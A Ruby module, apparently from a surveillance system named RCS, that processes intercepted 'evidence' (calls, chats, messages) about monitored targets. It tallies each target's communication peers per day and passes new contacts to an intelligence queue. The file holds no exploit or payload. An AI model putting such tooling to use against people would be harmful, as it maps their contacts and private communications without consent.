#
# Aggregator processing module
#
# the evidence to be processed are queued by the workers
#

require 'rcs-common/trace'
require 'rcs-common/fixnum'
require 'rcs-common/sanitize'
require 'fileutils'

require_relative 'peer'

module RCS
module Aggregator

class Processor
  extend RCS::Tracer

  def self.run
    # infinite processing loop
    loop do
      # get the first entry from the queue and mark it as processed to avoid
      # conflicts with multiple processors
      if (queued = AggregatorQueue.get_queued)
        entry = queued.first
        count = queued.last
        trace :info, "#{count} evidence to be processed in queue"
        process entry
      else
        #trace :debug, "Nothing to do, waiting..."
        sleep 1
      end
    end
  end


  def self.process(entry)
    ev = Evidence.collection_class(entry['target_id']).find(entry['evidence_id'])
    target = Item.find(entry['target_id'])

    trace :info, "Processing #{ev.type} for target #{target.name}"

    # extract peer(s) from call, mail, chat, sms
    data = extract_data(ev)

    trace :debug, ev.data.inspect

    data.each do |datum|
      # already exist?
      #   update
      # else
      #   create new one

      type = ev.type
      type = datum[:type] unless datum[:type].nil?

      # twitter does not have a peer to sent message to :)
      next if type.eql? 'twitter'

      # we need to find a document that is in the same day, same type and that have the same peer and versus
      # if not found, create a new entry, otherwise increment the number of occurrences
      params = {aid: ev.aid, day: Time.at(ev.da).strftime('%Y%m%d'), type: type, data: {peer: datum[:peer], versus: datum[:versus]}}

      # find the existing aggregate or create a new one
      agg = Aggregate.collection_class(entry['target_id']).find_or_create_by(params)

      # if it's new: add the entry to the summary and notify the intelligence
      if agg.count == 0
        Aggregate.collection_class(entry['target_id']).add_to_summary(type, datum[:peer])
        IntelligenceQueue.add(entry['target_id'], agg._id, :aggregate) if check_intelligence_license
      end

      # we are sure we have the object persisted in the db
      # so we have to perform an atomic operation because we have multiple aggregator working concurrently
      agg.inc(:count, 1)

      # sum up the duration (or size)
      agg.inc(:size, datum[:size])

      trace :info, "Aggregated #{target.name}: #{agg.day} #{agg.type} #{agg.count} #{agg.data.inspect} " + (type.eql?('call') ? "#{agg.size} sec" : "#{agg.size.to_s_bytes}")
    end

  rescue Exception => e
    trace :error, "Cannot process evidence: #{e.message}"
    trace :fatal, e.backtrace.join("\n")
  end

  def self.check_intelligence_license
    LicenseManager.instance.check :intelligence
  end

  def self.extract_data(ev)
    data = []

    case ev.type
      when 'call'
        data += PeerAggregator.extract_call(ev)

      when 'chat'
        data += PeerAggregator.extract_chat(ev)

      when 'message'
        data += PeerAggregator.extract_message(ev)

    end

    return data
  end



end

end #OCR::
end #RCS::